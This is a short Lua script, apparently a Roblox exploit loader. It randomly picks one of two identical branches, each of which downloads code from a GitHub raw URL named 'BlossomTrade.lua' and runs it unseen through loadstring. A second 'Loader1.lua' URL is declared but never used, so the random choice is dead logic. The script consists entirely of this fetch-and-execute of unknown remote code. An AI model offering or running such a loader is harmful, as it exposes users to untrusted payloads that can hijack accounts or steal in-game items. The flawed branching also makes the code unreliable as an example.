math.randomseed(tick())  -- or os.time() outside of Roblox

local URL1 = "https://raw.githubusercontent.com/HyperRamzey/test/refs/heads/main/BlossomTrade.lua"
local URL2 = "https://raw.githubusercontent.com/HyperRamzey/test/refs/heads/main/Loader1.lua"

if math.random(1, 2) == 1 then
    local code = game:HttpGet(URL1)
    local func = loadstring(code)
    if func then func() end
else
    local code = game:HttpGet(URL1)
    local func = loadstring(code)
    if func then func() end
end
